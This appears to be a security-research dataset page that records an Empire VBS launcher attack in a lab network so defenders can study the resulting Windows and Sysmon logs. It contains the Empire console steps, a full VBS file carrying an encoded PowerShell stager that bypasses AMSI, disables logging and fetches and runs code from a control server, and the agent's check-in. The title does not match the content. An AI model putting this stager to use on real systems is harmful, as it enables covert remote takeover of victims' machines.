
# Empire Net User

An adversary can use a VBS script as a launcher for initial access.

## Technique(s) ID

T1064

## Creators

Roberto Rodriguez [@Cyb3rWard0g](https://twitter.com/Cyb3rWard0g)

## dataset

[empire_launcher_vbs.tar.gz](./empire_launcher_vbs.tar.gz)

## Nnetwork Environment

Shire

## Time Taken

2019-03-11223154

## About this file

| log_name                                 | task                                                   |   record_number |
|------------------------------------------|--------------------------------------------------------|-----------------|
| Windows PowerShell                       | Pipeline Execution Details                             |              39 |
| Windows PowerShell                       | Provider Lifecycle                                     |               6 |
| Windows PowerShell                       | Engine Lifecycle                                       |               1 |
| Security                                 | Filtering Platform Connection                          |             383 |
| Security                                 | Token Right Adjusted Events                            |             140 |
| Security                                 | User Account Management                                |             127 |
| Security                                 | Sensitive Privilege Use                                |              33 |
| Security                                 | Process Creation                                       |              19 |
| Security                                 | Process Termination                                    |              11 |
| Security                                 | Authorization Policy Change                            |               8 |
| Security                                 | MPSSVC Rule-Level Policy Change                        |               8 |
| Security                                 | Special Logon                                          |               5 |
| Security                                 | Group Membership                                       |               4 |
| Security                                 | Logon                                                  |               4 |
| Security                                 | Logoff                                                 |               2 |
| Security                                 | Other Object Access Events                             |               2 |
| Security                                 | Detailed File Share                                    |               1 |
| Security                                 | File Share                                             |               1 |
| Microsoft-Windows-Sysmon/Operational     | Process accessed (rule: ProcessAccess)                 |            1576 |
| Microsoft-Windows-Sysmon/Operational     | Image loaded (rule: ImageLoad)                         |            1282 |
| Microsoft-Windows-Sysmon/Operational     | Registry object added or deleted (rule: RegistryEvent) |             780 |
| Microsoft-Windows-Sysmon/Operational     | Registry value set (rule: RegistryEvent)               |             353 |
| Microsoft-Windows-Sysmon/Operational     | Network connection detected (rule: NetworkConnect)     |             114 |
| Microsoft-Windows-Sysmon/Operational     | RawAccessRead detected (rule: RawAccessRead)           |              60 |
| Microsoft-Windows-Sysmon/Operational     | File created (rule: FileCreate)                        |              51 |
| Microsoft-Windows-Sysmon/Operational     | Pipe Connected (rule: PipeEvent)                       |              49 |
| Microsoft-Windows-Sysmon/Operational     | Process Create (rule: ProcessCreate)                   |              17 |
| Microsoft-Windows-Sysmon/Operational     | Pipe Created (rule: PipeEvent)                         |               1 |
| Microsoft-Windows-PowerShell/Operational | Executing Pipeline                                     |              42 |
| Microsoft-Windows-PowerShell/Operational | PowerShell Console Startup                             |               2 |
| Microsoft-Windows-PowerShell/Operational | Execute a Remote Command                               |               1 |
| Microsoft-Windows-PowerShell/Operational | PowerShell Named Pipe IPC                              |               1 |
| Microsoft-Windows-PowerShell/Operational | Starting Command                                       |               1 |

## Empire Activity

```
usestager windows/launcher_vbs
set Listener https
execute
```

```
(Empire: listeners) > usestager windows/launcher_vbs
(Empire: stager/windows/launcher_vbs) > info

Name: VBS Launcher

Description:
  Generates a .vbs launcher for Empire.

Options:

  Name             Required    Value             Description
  ----             --------    -------           -----------
  Listener         True                          Listener to generate stager for.
  OutFile          False       /tmp/launcher.vbs File to output .vbs launcher to,
                                                 otherwise displayed on the screen.
  Obfuscate        False       False             Switch. Obfuscate the launcher
                                                 powershell code, uses the
                                                 ObfuscateCommand for obfuscation types.
                                                 For powershell only.
  ObfuscateCommand False       Token\All\1,Launcher\PS\12467The Invoke-Obfuscation command to use.
                                                 Only used if Obfuscate switch is True.
                                                 For powershell only.
  Language         True        powershell        Language of the stager to generate.
  ProxyCreds       False       default           Proxy credentials
                                                 ([domain\]username:password) to use for
                                                 request (default, none, or other).
  UserAgent        False       default           User-agent string to use for the staging
                                                 request (default, none, or other).
  Proxy            False       default           Proxy to use for request (default, none,
                                                 or other).
  StagerRetries    False       0                 Times for the stager to retry
                                                 connecting.


(Empire: stager/windows/launcher_vbs) > set Listener https
(Empire: stager/windows/launcher_vbs) > execute

[*] Stager output written out to: /tmp/launcher.vbs

(Empire: stager/windows/launcher_vbs) > 
```

File is created and contains:

```
Dim objShell
Set objShell = WScript.CreateObject("WScript.Shell")
command = "powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAEEAQgBMAGUALgBQAFMAVgBFAFIAUwBpAE8AbgAuAE0AYQBKAE8AUgAgAC0ARwBlACAAMwApAHsAJABkADMAOQA4ADIAPQBbAFIAZQBGAF0ALgBBAFMAcwBlAE0AYgBMAFkALgBHAGUAVABUAFkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAHQARgBpAEUAYABsAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQARAAzADkAOAAyACkAewAkADkAZQA1AGEAYgA9ACQAZAAzADkAOAAyAC4ARwBFAHQAVgBhAEwAVQBlACgAJABuAHUAbABsACkAOwBJAGYAKAAkADkAZQA1AEEAQgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADkAZQA1AGEAYgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA5AEUANQBhAGIAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEATAA9AFsAQwBvAEwAbABFAGMAdABJAE8AbgBTAC4ARwBFAG4ARQByAEkAYwAuAEQAaQBDAHQASQBvAE4AQQBSAFkAWwBzAHQAcgBJAG4AZwAsAFMAeQBTAHQAZQBtAC4ATwBCAGoARQBjAFQAXQBdADoAOgBOAGUAVwAoACkAOwAkAHYAYQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAHYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAOQBlADUAQQBCAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAYQBsAH0ARQBsAHMARQB7AFsAUwBDAFIAaQBQAFQAQgBMAE8AYwBLAF0ALgAiAEcAZQB0AEYASQBlAGAATABEACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEAbAB1AEUAKAAkAE4AVQBMAGwALAAoAE4ARQB3AC0ATwBiAEoARQBDAHQAIABDAG8AbABsAEUAYwBUAEkAbwBuAFMALgBHAGUATgBFAFIAaQBjAC4ASABBAFMASABTAGUAdABbAHMAVAByAGkATgBHAF0AKQApAH0AJABSAGUARgA9AFsAUgBlAGYAXQAuAEEAcwBzAGUATQBCAGwAWQAuAEcAZQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBFAHQARgBpAEUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAGEATAB1AGUAKAAkAE4AVQBMAGwALAAkAHQAUgB1AEUAKQA7AH0AOwBbAFMAWQBzAFQARQBtAC4ATgBlAHQALgBTAEUAcgBWAEkAYwBlAFAAbwBpAG4AdABNAGEAbgBhAEcAZQByAF0AOgA6AEUAeABwAEUAYwB0ADEAMAAwAEMATwBuAFQASQBOAHUAZQA9ADAAOwAkADMAOAA3AEEAMQA9AE4ARQBXAC0ATwBiAEoARQBDAHQAIABTAHkAcwB0AEUAbQAuAE4ARQBUAC4AVwBFAEIAQwBMAGkARQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQAMwA4ADcAYQAxAC4ASABFAEEAZABlAFIAUwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAMwA4ADcAQQAxAC4ASABlAGEAZABlAHIAcwAuAEEAZABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAMwA4ADcAQQAxAC4AUABSAG8AeAB5AD0AWwBTAFkAcwB0AEUATQAuAE4ARQB0AC4AVwBFAGIAUgBlAHEAVQBlAFMAVABdADoAOgBEAEUARgBhAFUATAB0AFcARQBiAFAAUgBPAFgAeQA7ACQAMwA4ADcAQQAxAC4AUABSAE8AWABZAC4AQwBSAEUAZABlAE4AdABJAEEATABzACAAPQAgAFsAUwB5AHMAVABlAE0ALgBOAEUAdAAuAEMAUgBlAGQAZQBOAHQAaQBBAGwAQwBBAGMAaABlAF0AOgA6AEQARQBGAGEAVQBsAHQATgBlAHQAdwBvAHIASwBDAFIAZQBkAGUAbgB0AGkAYQBsAFMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQAMwA4ADcAYQAxAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwB0AGUATQAuAFQAZQBYAHQALgBFAE4AQwBvAGQASQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgBZAFQARQBzACgAJwBkAEoAaQBxAEEANQBvAEYAewBwAFUANwBMAG4AawA6AC4ALwBJAFEAVwBUADEAcgBEAHYAKABnAEIANABSAH0AJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBHAFMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAE8AdQBOAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AQgB4AE8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJABzAGUAcgA9ACQAKABbAFQARQB4AFQALgBFAG4AYwBPAEQAaQBOAGcAXQA6ADoAVQBOAEkAYwBvAGQARQAuAEcARQBUAFMAVABSAEkAbgBnACgAWwBDAE8ATgBWAEUAUgBUAF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwBUAHIAaQBuAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQgB6AEEARABvAEEATAB3AEEAdgBBAEQARQBBAE0AQQBBAHUAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAeABBAEQAQQBBAE4AZwBBADYAQQBEAFEAQQBOAEEAQQB6AEEAQQA9AD0AJwApACkAKQA7ACQAdAA9ACcALwBuAGUAdwBzAC4AcABoAHAAJwA7ACQAMwA4ADcAQQAxAC4ASABlAEEARABFAHIAcwAuAEEAZABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBFAFcAcQBYAGQAcgBBAHEAbgBQAFIAawBNAEoAdQBGAD0AaAB4AGoARgBKAGoAbwBBAFAAegBiAEUASQB4ACsANABQADgAZgBCAGsAOQBHAEYASAAyAE0APQAiACkAOwAkAGQAQQBUAEEAPQAkADMAOAA3AGEAMQAuAEQAbwB3AG4AbABvAGEAZABEAEEAdABhACgAJABzAEUAUgArACQAVAApADsAJABJAFYAPQAkAGQAYQB0AEEAWwAwAC4ALgAzAF0AOwAkAEQAQQB0AEEAPQAkAGQAQQBUAEEAWwA0AC4ALgAkAEQAQQB0AEEALgBsAGUATgBHAFQAaABdADsALQBqAG8ASQBOAFsAQwBIAEEAUgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAYQBUAGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA=="
objShell.Run command,0
Set objShell = Nothing
```

User downloads and clicks on vbs file:

![alt text](../../../../../resources/images/empire_launcher_vbs.png "vbs script")

New agent checks in..

```
(Empire: stager/windows/launcher_vbs) > [*] Sending POWERSHELL stager (stage 1) to 10.0.10.104
[*] New agent 7NTMF3VR checked in
[+] Initial agent 7NTMF3VR from 10.0.10.104 now active (Slack)
[*] Sending agent (stage 2) to 7NTMF3VR at 10.0.10.104

(Empire: stager/windows/launcher_vbs) > 
(Empire: stager/windows/launcher_vbs) > agents

[*] Active agents:

 Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
 ----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
 7NTMF3VR ps 172.18.39.105   IT001             SHIRE\pgustavo          powershell         6536   5/0.0    2019-03-11 22:31:54  https           

(Empire: agents) >
```